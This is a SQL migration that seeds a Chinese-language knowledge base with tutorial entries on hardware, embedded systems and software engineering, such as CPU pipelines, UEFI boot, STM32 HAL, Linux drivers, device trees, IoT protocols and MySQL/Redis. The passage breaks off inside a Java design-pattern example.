-- ============================================================
-- 0005_kb_fill_gaps.sql
-- 补充知识库未覆盖子分类的详细条目（37 条）
-- 幂等：ON CONFLICT (slug) DO NOTHING
-- 所有代码块用三反引号包裹，配合前端 markdown.js 渲染为专业代码盒
-- ============================================================

insert into public.kb_entries (title, slug, summary, content, category, subcategory, tags, stage, source, difficulty)
values

-- ============ 硬件底层（5 条） ============

('数字电路与逻辑设计：从布尔代数到时序电路', 'hw-digital-logic-design',
 '数字电路是计算机的数学根基：布尔代数→逻辑门→组合/时序电路→有限状态机。',
 $md$# 数字电路与逻辑设计

## 一、布尔代数与逻辑门
- 基本运算：与(·)、或(+)、非(¯)、异或(⊕)。
- 德摩根定律：`A·B = ¬(¬A+¬B)`，`A+B = ¬(¬A·¬B)`。
- CMOS 实现：NAND/NOR 是万能门，任意逻辑都能用它们搭。

## 二、组合逻辑电路
- **半加器**：`sum = a⊕b`，`carry = a·b`。
- **全加器**：3 输入（a,b,cin），sum = a⊕b⊕cin，cout = (a·b)+(cin·(a⊕b))。
- **多路选择器 MUX**：2^n 选 1，n 根选择线。
- **译码器**：n→2^n，如 3-8 译码器 74LS138。
- **编码器/优先编码器**：74LS148。

## 三、时序逻辑电路
- **锁存器 Latch**：电平触发，透明时输出随输入变。
- **触发器 Flip-Flop**：边沿触发，D/JK/T 触发器。
- **寄存器**：N 个 D 触发器并联，存 N 位数据。
- **计数器**：异步纹波（74LS90）、同步（74LS161）。

## 四、有限状态机 FSM
- **Moore 型**：输出仅依赖当前状态。
- **Mealy 型**：输出依赖状态+输入。
- 设计步骤：状态图→状态表→编码→次态/输出方程→电路。

## 五、时序约束
- 建立时间 `t_su`：数据需在时钟沿前稳定。
- 保持时间 `t_h`：数据需在时钟沿后保持。
- 时钟周期 ≥ t_cq + t_comb + t_su。

## 六、实战工具
```bash
# Logisim 模拟全加器（GUI 拖拽）
# 用 Verilog 描述并仿真
```

```verilog
// 4 位行波进位加法器
module ripple_adder(input  [3:0] a, b,
                    input         cin,
                    output [3:0]  sum,
                    output        cout);
  wire [3:0] c;
  assign c[0] = cin;
  genvar i;
  generate
    for (i = 0; i < 4; i = i + 1) begin: fa
      full_adder fa_inst(
        .a(a[i]), .b(b[i]), .cin(c[i]),
        .sum(sum[i]), .cout(c[i+1]));
    end
  endgenerate
  assign cout = c[4];
endmodule
```

## 小结
组合逻辑无记忆，时序逻辑有时钟；Moore 输出稳、Mealy 响应快；时序约束决定最高频率。
$md$,
'硬件底层', '数字电路与逻辑设计', array['布尔代数','触发器','FSM','Verilog'], 'growing', '课程笔记', 3),

('CPU 体系结构：指令集、流水线与乱序执行', 'hw-cpu-architecture-isa',
 'ISA 是软硬件契约：RISC vs CISC、流水线冒险、分支预测与 superscalar。',
 $md$# CPU 体系结构

## 一、指令集架构 ISA
| 类型 | 代表 | 特点 |
|---|---|---|
| RISC | ARM/MIPS/RISC-V | 定长指令、Load/Store、寄存器多 |
| CISC | x86 | 变长指令、内存操作数、微码解码 |

- **RISC-V**：模块化（RV32I 基础 + M/A/F/D/C 扩展），开源免费。

## 二、经典五级流水线
IF(取指) → ID(译码) → EX(执行) → MEM(访存) → WB(写回)

### 三大冒险
1. **结构冒险**：同周期同部件冲突 → 哈佛结构（分离 I-Cache/D-Cache）。
2. **数据冒险**：RAW 相关 → 转发(forwarding)、停顿(bubble)。
3. **控制冒险**：分支跳转 → 分支预测(BTB/BHT)、延迟槽。

## 三、superscalar 与乱序执行
- **多发射**：每周期发射多条指令（Intel Golden Cove 6 发射）。
- **寄存器重命名**：消除 WAR/WAW 假相关。
- **Tomasulo 算法**：保留站 + 公共数据总线 CDB。
- **ROB 重排序缓冲**：乱序执行、顺序提交。

## 四、分支预测
- **静态**：默认不跳转 / BTFN。
- **动态**：2-bit 饱和计数器、两级自适应 GShare。
- **深流水线对预测精度极敏感**（Pentium 4 31 级 → 失误惩罚大）。

## 五、缓存与内存一致性
- MESI 协议：M(修改)/E(独占)/S(共享)/I(无效)。
- 写策略：Write-through / Write-back；Write-allocate / No-write-allocate。

## 六、实战观察
```bash
# 查看微架构与缓存层级
lscpu
cat /proc/cpuinfo | grep -E 'model name|cache size'
# 性能计数器
perf stat -e instructions,cache-misses,branch-misses ./bench
```

## 小结
现代 CPU = 多发射 + 乱序 + 分支预测 + 多级缓存 + 多核；软件层要懂局部性、伪共享、分支友好。
$md$,
'硬件底层', 'CPU 体系结构', array['ISA','流水线','乱序','分支预测'], 'growing', '书籍笔记', 4),

('主板与芯片组：从南桥北桥到 SoC', 'hw-motherboard-chipset',
 '主板是骨架，芯片组是中枢：南北桥架构演进到 SoC 平台化。',
 $md$# 主板与芯片组

## 一、主板构成
- **PCB 层**：4-12 层，电源/地/信号分层。
- **总线**：PCIe、DMI、SPI、I2C、LPC（旧外设）。
- **供电**：VRM 多相供电，CPU 核压精度 ±5mV。
- **时钟**：晶振 24MHz/32.768kHz，倍频到 GHz。

## 二、芯片组演进
| 时代 | 北桥 | 南桥 | 说明 |
|---|---|---|---|
| 早期 Intel | MCH/GMCH | ICH | 北桥管内存/显卡，南桥管外设 |
| Nehalem+ | 集成进 CPU | PCH | 内存控制器上 CPU |
| 现代 SoC | 全集成 | - | 苹果 M 系列、AMD APU |

- **PCH（Platform Controller Hub）**：管理 PCIe 下游、USB、SATA、音频、网络。
- **DMI 链接**：CPU↔PCH 的 PCIe x4 通道（4.0 约 8GB/s）。

## 三、关键接口分布
- CPU 直连：内存 DIMM、PCIe x16（独显）、PCIe NVMe（部分直连）。
- PCH 提供：USB 端口、SATA、PCIe 通用、I2C/SPI 外设。

## 四、BIOS/UEFI 与 ACPI
- **UEFI**：取代传统 BIOS，支持 GPT 大盘、图形化、网络启动。
- **ACPI 表**：DSDT 描述设备，操作系统通过 ACPI 接管电源/中断。

## 五、服务器主板特色
- **双路/四路**：多 socket，QPI/UPI 互联。
- **ECC 内存**：纠正单比特错、检测双比特。
- **BMC/IPMI**：独立管理网卡，带外远程控制。

## 六、实战查看
```bash
# Linux 查看主板信息
sudo dmidecode -t baseboard
sudo dmidecode -t slot      # PCIe 插槽
lspci -t                    # PCIe 拓扑树
sensors                     # 温度/电压
```

## 小结
理解主板有助于装机、排障固件、优化外设布线；服务器要懂 BMC、ECC、UPI 互联。
$md$,
'硬件底层', '主板与芯片组', array['主板','芯片组','PCH','VRM'], 'seedling', '硬件笔记', 2),

('GPU 与并行计算：SIMT、CUDA 与通用计算', 'hw-gpu-parallel-computing',
 'GPU 用数千核心做 SIMD/SIMT 大规模并行：图形渲染、深度学习、科学计算。',
 $md$# GPU 与并行计算

## 一、GPU vs CPU
| 维度 | CPU | GPU |
|---|---|---|
| 核数 | 8-128 | 数千 |
| 单核性能 | 强（乱序+大缓存） | 弱（顺序+小缓存） |
| 内存带宽 | ~50GB/s | ~1TB/s（HBM） |
| 适用 | 低延迟、控制密集 | 高吞吐、数据并行 |

## 二、SIMT 执行模型
- **Warp（NVIDIA）/Wavefront（AMD）**：32/64 线程为一组，锁步执行同一条指令。
- 分支分歧(divergence)：if/else 导致 warp 内线程分叉，串行执行两边。
- **占用率 Occupancy**：活跃 warp / 最大 warp，影响延迟隐藏。

## 三、CUDA 编程模型
```cuda
// 向量加法：C = A + B
__global__ void vecAdd(float* A, float* B, float* C, int N) {
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    if (i < N) C[i] = A[i] + B[i];
}

// 启动配置
int N = 1 << 20;
int threads = 256;
int blocks = (N + threads - 1) / threads;
vecAdd<<<blocks, threads>>>(d_A, d_B, d_C, N);
```

## 四、内存层级
| 层级 | 范围 | 延迟 | 带宽 |
|---|---|---|---|
| 寄存器 | 线程私有 | 1 cycle | 极高 |
| 共享内存 | 块内共享 | ~30 cycle | 高 |
| L1/L2 | 全局缓存 | 100-300 cycle | 中 |
| 全局内存 HBM | 所有线程 | 400-800 cycle | ~1TB/s |

## 五、性能优化要点
1. **合并访存 coalesced**：warp 内线程访问连续地址 → 单次事务。
2. **Bank 冲突**：共享内存 32 bank，同 bank 不同地址会串行化。
3. **tiling 分块**：把数据切到共享内存，复用减少全局访存。
4. **warp 减少 divergence**：少用条件分支。

## 六、生态与框架
- **CUDA**：NVIDIA 专属，cuBLAS/cuDNN/TensorRT。
- **OpenCL**：跨厂商，语法繁琐。
- **ROCm/HIP**：AMD 对标 CUDA。
- **SYCL/oneAPI**：Intel 跨架构。

## 七、实战查看
```bash
nvidia-smi            # 显卡状态
nvidia-smi -q -d MEMORY  # 显存详情
nvprof / nsys profile ./mykernel  # 性能剖析
```

## 小结
GPU 是吞吐怪兽；写 CUDA 要懂 warp、coalesced、tiling；深度学习让 GPU 成了算力硬通货。
$md$,
'硬件底层', 'GPU 与并行计算', array['GPU','CUDA','SIMT','并行'], 'growing', '课程笔记', 4),

('固件 BIOS/UEFI：开机到操作系统的第一公里', 'hw-firmware-bios-uefi',
 'BIOS/UEFI 是硬件与 OS 之间的桥梁：POST 自检、引导、ACPI、Secure Boot。',
 $md$# 固件 BIOS/UEFI

## 一、BIOS vs UEFI
| 维度 | BIOS | UEFI |
|---|---|---|
| 启动模式 | Legacy 16 位 | 32/64 位 |
| 分区表 | MBR（≤2TB、4 主分区） | GPT（大磁盘、128 分区） |
| 界面 | 文本菜单 | 图形化+鼠标 |
| 启动盘 | 512B 引导扇区 | EFI 系统分区 ESP |

## 二、开机启动流程
1. **通电**：电源 PG 信号就绪。
2. **POST 自检**：CPU/内存/显卡/外设逐项检测。
3. **初始化**：BIOS/UEFI 初始化硬件、加载 ACPI 表。
4. **引导**：UEFI 读 ESP 分区 `/EFI/BOOT/BOOTX64.EFI`，Legacy 读 MBR。
5. **Bootloader**：GRUB/systemd-boot/Windows Boot Manager。
6. **内核加载**：vmlinuz + initramfs → 挂载根分区 → systemd。

## 三、UEFI 关键概念
- **ESP 分区**：FAT32，存放 .efi 引导文件。
- **Secure Boot**：校验引导文件签名，防 rootkit。
- **CSM 兼容模块**：UEFI 里跑 Legacy BIOS。
- **ACPI/UEFI 变量**：`efivarfs` 挂在 `/sys/firmware/efi/efivars`。

## 四、实战查看与修改
```bash
# 判断启动模式
ls /sys/firmware/efi      # 存在则为 UEFI
[ -d /sys/firmware/efi ] && echo "UEFI" || echo "Legacy"

# 查看 UEFI 变量
efibootmgr                # 启动项列表
efibootmgr -c -d /dev/sda -p 1 -L "MyLinux" -l '\EFI\mylinux\grubx64.efi'

# 备份/恢复 UEFI 变量
cp -r /sys/firmware/efi/efivars /backup/
```

## 五、固件刷新
- **UEFI Capsule Update**：操作系统内推送固件更新。
- **主板工具**：ASUS EZ Flash、MSI M-Flash。
- **Linux fwupd**：`fwupdmgr update`。

## 六、常见排障
- 启动慢 → 关闭 CSM、无用设备自检、串口日志。
- Secure Boot 拦截 Linux → 注册自签名密钥 `mokutil`。
- 找不到启动盘 → 检查 ESP、启动顺序。

## 小结
UEFI 是现代启动标准，懂它就能优雅处理双系统、Secure Boot、固件刷新、引导修复。
$md$,
'硬件底层', '固件（BIOS/UEFI）', array['BIOS','UEFI','POST','Secure Boot'], 'growing', '硬件笔记', 3),

-- ============ 嵌入式（5 条） ============

('STM32 与 ARM Cortex-M：从最小工程到外设驱动', 'emb-stm32-cortex-m',
 'STM32 是 Cortex-M 学习样板：启动文件、HAL/LL 库、CubeMX 图形化配置。',
 $md$# STM32 与 ARM Cortex-M

## 一、Cortex-M 内核家族
| 内核 | 架构 | 流水线 | 适用 |
|---|---|---|---|
| M0/M0+ | ARMv6-M | 3 级 | 低成本、IoT |
| M3 | ARMv7-M | 3 级 | 通用、有 MMU 类 MPU |
| M4 | ARMv7E-M | 3 级 | DSP/FPU 单精度 |
| M7 | ARMv7E-M | 6 级 | 高性能、双精度 FPU |
| M33/M55 | ARMv8-M | - | TrustZone、Helium |

## 二、STM32 外设地图
- **GPIO**：8 种模式（输入上拉/下拉/模拟，输出推挽/开漏，复用）。
- **RCC**：时钟树（HSE/HSI/PLL），所有外设都要先开时钟。
- **NVIC**：嵌套向量中断，优先级分组抢占/子优先级。
- **SysTick**：24 位倒计时，OS 心跳。
- **DMA**：内存↔外设搬运，CPU 不参与。
- **Flash/RAM**：部分型号支持 TCM 与 CCM。

## 三、最小工程结构
```
Project/
├── startup_stm32f103.s   ; 启动文件：栈、中断向量表、Reset_Handler
├── system_stm32f1xx.c    ; SystemInit 时钟初始化
├── main.c
└── stm32f1xx_it.c        ; 中断服务函数
```

## 四、点灯（HAL 库）
```c
#include "stm32f1xx_hal.h"

int main(void) {
    HAL_Init();
    SystemClock_Config();                 // 72MHz
    __HAL_RCC_GPIOC_CLK_ENABLE();
    GPIO_InitTypeDef g = {0};
    g.Pin = GPIO_PIN_13;
    g.Mode = GPIO_MODE_OUTPUT_PP;
    g.Speed = GPIO_SPEED_FREQ_LOW;
    HAL_GPIO_Init(GPIOC, &g);
    while (1) {
        HAL_GPIO_TogglePin(GPIOC, GPIO_PIN_13);
        HAL_Delay(500);
    }
}
```

## 五、CubeMX 生成流程
1. 选芯片型号 → 配置时钟树。
2. 配置外设（GPIO/UART/SPI/...）。
3. 生成 HAL 或 LL 工程（Keil/STM32CubeIDE/CMake）。
4. 用户代码写在 `USER CODE BEGIN/END` 之间。

## 六、调试与烧录
- **SWD/JTAG**：ST-Link / J-Link / DAPLink。
- **OpenOCD + GDB**：`openocd -f interface/stlink.cfg -f target/stm32f1x.cfg`。
- **printf 重定向**：重写 `_write` 把日志走 UART 或 ITM。

## 小结
STM32 入门要懂时钟树、NVIC、启动文件；HAL 易用但臃肿，LL 接近寄存器，工业量产常用 HAL+FreeRTOS。
$md$,
'嵌入式', 'STM32/ARM Cortex-M', array['STM32','Cortex-M','HAL','CubeMX'], 'growing', '实战总结', 3),

('寄存器、中断与 DMA：外设三板斧', 'emb-register-interrupt-dma',
 '寄存器读写驱动外设，中断异步响应事件，DMA 解放 CPU 搬数据。',
 $md$# 寄存器、中断与 DMA

## 一、寄存器抽象层级
1. **芯片手册寄存器**：地址 + 位域（如 GPIOA_ODR @0x48000014）。
2. **CMSIS SFR**：`#define GPIOA_ODR (*(volatile uint32_t*)0x48000014)`。
3. **HAL/LL 封装**：`HAL_GPIO_WritePin(GPIOA, 5, SET)`。

`volatile` 必须加：编译器不能把寄存器读缓存在寄存器。

## 二、寄存器操作速写
```c
// 置位第 5 位（不读改写）
GPIOA->BSRR = (1 << 5);
// 清零第 5 位
GPIOA->BSRR = (1 << (5 + 16));
// 读改写改多bit
GPIOA->MODER = (GPIOA->MODER & ~(0b11 << 10)) | (0b01 << 10);
```

## 三、中断优先级与嵌套
- **抢占优先级**：可打断低级中断。
- **子优先级**：同级 pending 时排序。
- **NVIC 分组**：4 位优先级分组（如 4 抢占/0 子 → 1 抢占/3 子）。
- **向量表**：`SCB->VTOR` 指向中断函数指针数组。

```c
void EXTI9_5_IRQHandler(void) {
    if (__HAL_GPIO_EXTI_GET_IT(5)) {
        __HAL_GPIO_EXTI_CLEAR_IT(5);
        // 用户逻辑
    }
}
```

## 四、中断抖动与去抖
- 硬件：RC 滤波 + 施密特触发。
- 软件：中断置 flag，主循环延时去抖；或定时器定时采样。

## 五、DMA 原理
- **外设→内存**：ADC 采样、UART 接收。
- **内存→外设**：SPI 发送、DAC 输出。
- **内存→内存**：memcpy 加速（部分芯片支持）。
- **传输模式**：Normal（一次）、Circular（环形缓冲）。
- **双缓冲**：半完成中断 + 全完成中断交替。

```c
// UART + DMA 环形接收
HAL_UART_Receive_DMA(&huart1, rxBuf, BUF_SIZE);
// 完成回调中处理数据
void HAL_UART_RxCpltCallback(UART_HandleTypeDef* h) {
    // 拷出数据，重新启动接收
}
```

## 六、性能对比
- CPU 轮询读取：100% 占用。
- 中断读取：事件响应快，但每次搬运仍占 CPU。
- DMA 搬运：CPU 几乎零负担，吞吐最高。

## 小结
寄存器是最底层 API；中断解决"什么时候"问题；DMA 解决"高频大流量"问题；三者组合是嵌入式性能三件套。
$md$,
'嵌入式', '寄存器与中断/DMA', array['寄存器','NVIC','DMA','中断'], 'growing', '实战总结', 3),

('嵌入式 Linux 与驱动：从交叉编译到字符设备', 'emb-embedded-linux-driver',
 '嵌入式 Linux 三件套：交叉编译工具链、U-Boot/内核/根文件系统、设备驱动。',
 $md$# 嵌入式 Linux 与驱动

## 一、开发环境
- **交叉编译工具链**：gcc-linaro / arm-linux-gnueabihf-gcc。
- **buildroot**：一站式构建 rootfs。
- **Yocto**：企业级发行版构建。

```bash
# 交叉编译 hello.c
arm-linux-gnueabihf-gcc hello.c -o hello
# 推送到开发板
scp hello root@192.168.1.10:/root/
```

## 二、系统组成
- **Bootloader**：U-Boot（环境变量、tftp 烧录、bootcmd）。
- **Kernel**：zImage/uImage + 设备树 dtb。
- **rootfs**：busybox、buildroot、debian。

## 三、U-Boot 常用命令
```bash
printenv                     # 查看环境变量
setenv bootargs 'console=ttyS0,115200 root=/dev/mmcblk0p2'
setenv bootcmd 'fatload mmc 0:1 0x80008000 zImage; fatload mmc 0:1 0x80f00000 imx6.dtb; bootz 0x80008000 - 0x80f00000'
saveenv
boot
```

## 四、字符设备驱动框架
```c
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/cdev.h>

static dev_t devno;
static struct cdev mycdev;

static ssize_t my_read(struct file* f, char __user* buf, size_t n, loff_t* off) {
    // copy_to_user 把内核数据搬到用户空间
    return 0;
}

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .read  = my_read,
};

static int __init my_init(void) {
    alloc_chrdev_region(&devno, 0, 1, "mydev");
    cdev_init(&mycdev, &fops);
    cdev_add(&mycdev, devno, 1);
    return 0;
}
module_init(my_init);
MODULE_LICENSE("GPL");
```

## 五、Makefile 模板
```makefile
obj-m += mydrv.o
KDIR := /lib/modules/$(shell uname -r)/build
all:
	make -C $(KDIR) M=$(PWD) modules
```

## 六、平台总线与设备树绑定
- 驱动注册 `platform_driver`，通过 `of_match_table` 匹配 dtb 节点。
- `probe` 函数里申请资源、注册 cdev。
- 资源：`platform_get_resource` 取内存映射/中断号。

## 七、调试技巧
- `dmesg` 看内核日志。
- `devmem` 直接读写物理寄存器。
- ftrace / kprobe 追踪内核函数。
- gdbserver + gdb 远程调试驱动。

## 小结
嵌入式 Linux = 交叉编译 + U-Boot/Kernel/rootfs + 设备驱动；驱动要懂字符设备/平台总线/设备树三件套。
$md$,
'嵌入式', '嵌入式 Linux 与驱动', array['嵌入式Linux','U-Boot','驱动','字符设备'], 'seedling', '课程笔记', 4),

('设备树与内核裁剪：让 Linux 适配你的板子', 'emb-device-tree-kernel-trim',
 '设备树描述硬件、内核 menuconfig 裁剪功能，是嵌入式量产必备技能。',
 $md$# 设备树与内核裁剪

## 一、设备树语法 DTS
```dts
/dts-v1/;
/ {
    model = "My Board";
    compatible = "myboard,v1";

    aliases { serial0 = &uart0; };

    cpus { cpu@0 { device_type = "cpu"; compatible = "arm,cortex-a7"; }; };

    soc {
        compatible = "simple-bus";
        #address-cells = <1>;
        #size-cells = <1>;
        ranges;

        uart0: serial@40020000 {
            compatible = "myvendor,uart";
            reg = <0x40020000 0x1000>;
            interrupts = <0 25 4>;  // 类型 中断号 触发方式
            clocks = <&clk 5>;
            status = "okay";
        };
    };
};
```

## 二、常用节点
- `reg`：地址 + 长度。
- `interrupts`：中断号 + 触发类型（IRQ_TYPE_EDGE_RISING 等）。
- `compatible`：驱动匹配的字符串。
- `status`：`okay` / `disabled`。
- `aliases`：别名，方便 u-boot 传参。

## 三、编译与反编译
```bash
# 源码编译成 dtb
dtc -I dts -O dtb -o my.dtb my.dts
# dtb 反编译回 dts
dtc -I dtb -O dts -o back.dts my.dtb
# 内核里查看解析后的设备树
ls /proc/device-tree/
# 查看完整 dtb 文件
ls /sys/firmware/devicetree/base/
```

## 四、U-Boot 传 FDT
- `bootz` 命令：`bootz <kernel> - <dtb>`，dtb 地址在第三参数。
- 内核启动后用 `of_*` API 访问设备树。

## 五、内核裁剪（menuconfig）
```bash
make ARCH=arm menuconfig
# 关键裁剪方向
#  General setup → 关闭 CONFIG_BPF / CONFIG_FUTEX（如不需要）
#  Device Drivers → 删除用不到的总线/外设
#  File systems → 精简到 ext4/squashfs
#  Networking → 关闭 BT/hamradio 等用不到的协议
make ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- zImage dtbs -j8
```

## 六、裁剪经验
- **大小 vs 功能**：根文件系统比内核更容易瘦身（busybox + 极少库）。
- **模块化**：少量驱动编为 `.ko`，按需 insmod。
- **LTO**：内核开 LTO 可减小 5-10%。
- **initramfs**：减少 rootfs 挂载复杂度，单文件启动。

## 七、验证裁剪效果
```bash
size arch/arm/boot/compressed/vmlinux    # 代码段大小
ls -lh arch/arm/boot/zImage
# 启动失败时 earlycon 抓日志
earlycon=clk,pclk,uart,mmio32,0x40020000
```

## 小结
设备树解耦硬件描述与驱动代码；menuconfig 是裁剪主力；嵌入式量产要把内核/rootfs 压到几 MB 内。
$md$,
'嵌入式', '设备树与内核裁剪', array['设备树','menuconfig','内核裁剪','DTB'], 'seedling', '课程笔记', 4),

('物联网与低功耗设计：从 LoRa 到 NB-IoT', 'emb-iot-low-power',
 'IoT 三件事：连接、低功耗、安全；BLE/LoRa/NB-IoT 各有适用场景。',
 $md$# 物联网与低功耗设计

## 一、主流无线协议对比
| 协议 | 频段/速率 | 距离 | 功耗 | 典型场景 |
|---|---|---|---|---|
| BLE | 2.4G / 1-2Mbps | 10-100m | 低 | 手环、传感器 |
| Wi-Fi | 2.4/5G / 百兆 | 50m | 高 | 视频、智能家电 |
| LoRa | Sub-GHz / 0.3-50kbps | 2-15km | 极低 | 农业远程、抄表 |
| NB-IoT | 蜂窝 / 250kbps | 10km+ | 极低 | 共享单车、烟感 |
| Zigbee | 2.4G / 250kbps | 100m | 低 | 智能家居 mesh |

## 二、低功耗三板斧
1. **睡眠 + 中断唤醒**：CPU 99% 时间在 STOP/STANDBY。
2. **DMA + 外设自治**：定时采集不进 CPU。
3. **关闭无用时钟与外设**：RCC 关外设、GPIO 设模拟态。

```c
// STM32 低功耗模式
HAL_PWR_EnterSTOPMode(PWR_LOWPOWERREGULATOR_ON, PWR_STOPENTRY_WFI);
// 唤醒后重新配置时钟
SystemClock_Config();
```

## 三、低功耗设计要点
- **电源拓扑**：DC-DC 优于 LDO（效率 90% vs 50%）。
- **RTC 时钟源**：用 LSE 32.768kHz 晶振而非 HSI。
- **IO 状态**：未用引脚设模拟态，避免漏电。
- **上拉下拉**：匹配外设状态，杜绝悬空。

## 四、LoRa 应用要点
- **LoRaWAN**：Class A/B/C 三种终端，A 最低功耗。
- **OTAA**：Join 服务器协商密钥，比 ABP 安全。
- **Duty Cycle**：EU 868 频段 1% 占空比限制。

## 五、NB-IoT 流程
1. AT 命令集：`AT+CGDCONT` 设 APN，`AT+CGACT` 激活 PDP。
2. MQTT/CoAP 接入平台：阿里云 IoT、电信 AEP。
3. PSM/eDRX：进入省电模式，定时唤醒上报。

```c
// NB-IoT 发送数据（BC95 模组）
AT+NRB                       // 重启模组
AT+CGDCONT=1,"IP","cmnet"     // APN
AT+CGACT=1,1                  // 激活
AT+NSOCR=DGRAM,17,3000,1      // 创建 UDP socket
AT+NSOST=1,"139.196.1.1",5683,5,"68656c6c6f"  // 发送
```

## 六、安全设计
- **TLS/DTLS**：通道加密。
- **PSK**：预共享密钥，资源占用小。
- **证书**：每设备一张，烧录到安全元件。
- **OTA 升级**：A/B 双分区，差分升级省流量。

## 七、实战功耗测量
```bash
# 用 Otii/Power Profiler 测电流
# 关键指标
# - 睡眠电流：< 5μA（目标）
# - 发射峰值：NB-IoT ~220mA
# - 平均电流：μA 级别（一节 5 号电池撑一年）
```

## 小结
IoT 选协议看距离+功耗+成本；低功耗靠睡眠+DMA+关时钟；安全靠 TLS/PSK + OTA 双分区。
$md$,
'嵌入式', '物联网与低功耗设计', array['IoT','LoRa','NB-IoT','低功耗'], 'seedling', '实战总结', 3),

-- ============ 软件工程（5 条） ============

('编程语言对比：C/C++/Java/Go/Rust/Python/JS 选型', 'sw-programming-languages-compare',
 '七种主流语言的定位、范式、性能与适用场景速查。',
 $md$# 编程语言对比

## 一、总览表
| 语言 | 范式 | 编译 | 类型 | GC | 适用 |
|---|---|---|---|---|---|
| C | 过程 | 编译 | 静态弱 | 无 | 系统/嵌入式 |
| C++ | 多范式 | 编译 | 静态弱 | 无 | 引擎/框架 |
| Java | 面向对象 | 编译+JIT | 静态强 | 有 | 后端/Android |
| Go | 并发导向 | 编译 | 静态强 | 有 | 云原生/微服务 |
| Rust | 多范式 | 编译 | 静态强 | 无(所有权) | 系统/安全 |
| Python | 多范式 | 解释 | 动态 | 有 | 脚本/AI |
| JS | 多范式 | JIT | 动态 | 有 | 前端/Node |

## 二、内存管理对比
- **C/C++**：malloc/new 手动管，UAF/泄漏高发。
- **Java/Go/JS**：GC 自动回收，但 STW 影响延迟。
- **Rust**：所有权 + borrow checker，零成本抽象 + 编译期保证内存安全。

## 三、并发模型
```go
// Go goroutine + channel
go func() {
    ch <- compute()
}()
result := <-ch
```

```rust
// Rust 线程 + 所有权转移
use std::thread;
let v = vec![1, 2, 3];
let h = thread::spawn(move || {
    println!("{:?}", v);  // 所有权转移给子线程
});
h.join().unwrap();
```

## 四、生态与适用
- **C**：内核、嵌入式、Redis。
- **C++**：游戏引擎(UE)、浏览器内核、量化高频。
- **Java**：Spring Cloud、大数据(Hadoop/Spark)。
- **Go**：Docker/K8s、etcd、微服务网关。
- **Rust**：Linux 内核模块、ripgrep、Servo。
- **Python**：AI(TensorFlow/PyTorch)、爬虫、运维脚本。
- **JS/TS**：前端(Vue/React)、Node 后端。

## 五、性能排序（粗略）
C ≈ C++ ≈ Rust > Go > Java(JIT 后) > JS(JIT 后) > Python

## 六、选型建议
- 系统/嵌入式 → C/Rust
- 后端快速迭代 → Go/Java
- 高并发低延迟 → Rust/C++
- 数据/AI → Python
- 前端必学 → JS/TS

## 小结
没有银弹，按场景选：性能极致用 C/Rust，快速开发用 Python，云原生用 Go，后端稳定用 Java。
$md$,
'软件工程', '编程语言（C/C++/Java/Go/Rust/Python/JS）', array['编程语言','对比','选型'], 'growing', '实战总结', 2),

('数据库核心：MySQL 索引事务与 Redis 数据结构', 'sw-database-mysql-redis',
 'MySQL 靠 B+ 树索引和 InnoDB 事务，Redis 靠内存+单线程+多种数据结构。',
 $md$# 数据库核心

## 一、MySQL 存储引擎
| 维度 | InnoDB | MyISAM |
|---|---|---|
| 事务 | 支持 | 不支持 |
| 锁粒度 | 行锁 | 表锁 |
| 外键 | 支持 | 不支持 |
| 聚簇索引 | 是 | 否 |
| 崩溃恢复 | redo log | 崩溃易损 |

## 二、B+ 树索引
- **聚簇索引**：叶子节点存整行数据，按主键组织。
- **二级索引**：叶子存主键值，需回表。
- **覆盖索引**：查询列都在索引里，免回表。
- **最左前缀**：联合索引 (a,b,c) 可匹配 a / a,b / a,b,c。

```sql
-- 索引优化示例
EXPLAIN SELECT * FROM orders WHERE user_id = 100 AND created > '2026-01-01';
-- 建议联合索引
CREATE INDEX idx_user_created ON orders(user_id, created);
```

## 三、事务与隔离级别
- **ACID**：原子/一致/隔离/持久。
- **隔离级别**：RU/RC/RR/Serializable。
- **MVCC**：Read View + undo log，RR 级别下避免幻读（间隙锁）。
- **redo log/undo log/binlog**：崩溃恢复 + 主从复制 + 回滚。

## 四、Redis 数据结构
| 类型 | 底层 | 适用 |
|---|---|---|
| String | SDS | 计数、缓存 |
| List | quicklist(ziplist+链表) | 消息队列、最新 N |
| Hash | ziplist/hashtable | 对象字段 |
| Set | intset/hashtable | 去重、交并差 |
| ZSet | ziplist/skiplist+hashtable | 排行榜、延时队列 |
| Stream | radix tree | 持久化消息流 |

## 五、Redis 持久化
- **RDB**：快照，体积小恢复快，可能丢数据。
- **AOF**：追加日志，可 fsync 调安全性。
- **混合**：RDB + AOF 增量，平衡性能与安全。

## 六、缓存三大问题
1. **缓存穿透**：查不存在的 key → 布隆过滤器/空值缓存。
2. **缓存击穿**：热 key 失效 → 互斥锁/永不过期。
3. **缓存雪崩**：大量 key 同时失效 → 随机 TTL + 多级缓存。

## 七、实战运维
```bash
# MySQL 慢查询
mysqldumpslow -s t /var/log/mysql/slow.log

# Redis 性能
redis-cli --latency
redis-cli --bigkeys          # 找大key
redis-cli --hotkeys          # 找热key（LFU）
```

## 小结
MySQL 优化抓索引+事务+慢查询；Redis 性能靠合理数据结构 + 持久化权衡；分布式缓存要防穿透/击穿/雪崩。
$md$,
'软件工程', '数据库（MySQL/Redis）', array['MySQL','Redis','索引','事务'], 'growing', '实战总结', 3),

('设计模式与系统设计：从 23 模式到高并发架构', 'sw-design-patterns-system-design',
 '设计模式解决类级问题，系统设计解决架构级问题；二者都要懂可扩展性。',
 $md$# 设计模式与系统设计

## 一、创建型模式
- **单例**：`getInstance()` 全局唯一，注意线程安全（双重检查锁）。
- **工厂方法**：子类决定实例化哪个产品。
- **抽象工厂**：产品族创建。
- **建造者**：分步构造复杂对象（Lombok @Builder）。
- **原型**：clone 复制对象。

## 二、结构型模式
- **适配器**：接口转换（220V→5V）。
- **装饰器**：动态增强（Java IO 流套娃）。
- **代理**：远程/虚拟/保护（Spring AOP）。
- **外观**：子系统统一入口（Facade）。
- **组合**：树形结构统一处理。

## 三、行为型模式
- **策略**：算法族可替换（支付方式切换）。
- **观察者**：发布订阅（Vue 响应式、Kafka）。
- **责任链**：请求层层处理（Filter 链）。
- **状态**：状态机切换（订单流转）。
- **模板方法**：定义骨架，子类填步骤。

```java
// 策略模式
interface Payment { void pay(int amount); }
class WechatPay implements Payment { public void pay(int a){ System.out.println("微信"+a);} }
class Alipay implements Payment { public void pay(int a){ System.out.println("支付宝"+a);} }
class Checkout {
    private Payment p;
